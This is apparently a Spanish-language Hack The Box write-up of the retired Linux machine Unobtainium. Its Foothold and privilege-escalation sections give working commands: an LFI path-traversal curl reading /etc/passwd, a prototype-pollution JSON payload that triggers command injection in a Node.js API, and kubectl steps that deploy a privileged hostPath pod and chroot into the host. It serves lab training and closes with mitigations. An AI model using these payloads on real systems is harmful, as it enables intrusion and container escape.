---
machine: Unobtainium
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, electron, kubernetes, prototype-pollution, lfi, container-escape]
---

# Unobtainium — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

La web distribuye una aplicación Electron que se puede extraer con `asar`. El código revela un LFI, una contaminación de prototipos y una inyección de comandos en la API. La shell permite acceder a Kubernetes con credenciales de administrador y desplegar un pod malicioso que monta el host para llegar a root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80,3000 <IP>
```

- Puertos: `22/tcp` SSH, `80/tcp` HTTP y `3000/tcp` API Node.js.
- Servicios: Portal web, API y clúster de Kubernetes local.
- Tecnologías: Electron, ASAR, Node.js, Kubernetes y Docker.

## Enumeración

- `unobtainium.htb` con descarga de la app Electron.
- API en el puerto 3000.
- `app.asar` con el código del cliente y endpoints.
- Token o kubeconfig con permisos en el clúster.

## Foothold

Se extrae el ASAR y se revisan las llamadas a la API. El LFI lee archivos del servidor; la contaminación de prototipos altera opciones y la inyección de comandos ejecuta una shell en el contenedor.

```bash
wget http://unobtainium.htb/download/unobtainium.AppImage
npx asar extract app.asar app
# LFI
curl 'http://unobtainium.htb/api/download?file=../../../../etc/passwd'
# Prototype pollution + command injection en la API
curl -s -X POST http://unobtainium.htb:3000/api/run -H 'Content-Type: application/json' \
  -d '{"__proto__":{"shell":true},"cmd":"id"}'
```

## Movimiento lateral

La shell del contenedor permite leer el token de servicio y la configuración de Kubernetes. Con esas credenciales se enumeran pods, secrets y permisos del clúster.

## Escalada de privilegios

El token permite crear pods. Se despliega un pod privilegiado con `hostPath: /` y se monta el sistema de archivos del nodo; desde él se accede a la clave o al binario necesario para root.

```bash
kubectl --token=<TOKEN> --server=https://<API>:6443 get pods
kubectl --token=<TOKEN> --server=https://<API>:6443 apply -f malicious-pod.yaml
kubectl --token=<TOKEN> --server=https://<API>:6443 exec -it pwn -- chroot /host /bin/bash
```

## Evidencia

- ASAR extraído y endpoints de la API.
- LFI y ejecución de comandos en el contenedor.
- Pod privilegiado con montaje del host y shell de root.

## Lecciones aprendidas

- Una app Electron filtra lógica y endpoints del servidor.
- La contaminación de prototipos puede habilitar RCE en Node.js.
- Un token de Kubernetes con creación de pods es equivalente a root en el nodo.

## Mitigación y detección

- No incluir secretos ni lógica sensible en el cliente.
- Validar esquemas JSON y congelar prototipos.
- Aplicar RBAC mínimo y prohibir pods privilegiados o con `hostPath`.

## Referencias

- [0xdf — Unobtainium](https://0xdf.gitlab.io/2021/09/04/htb-unobtainium.html)
- [IppSec — Unobtainium](https://www.youtube.com/watch?v=UgHt_Y3vdNg)
- [Hack The Box — Unobtainium](https://app.hackthebox.com/machines/unobtainium)
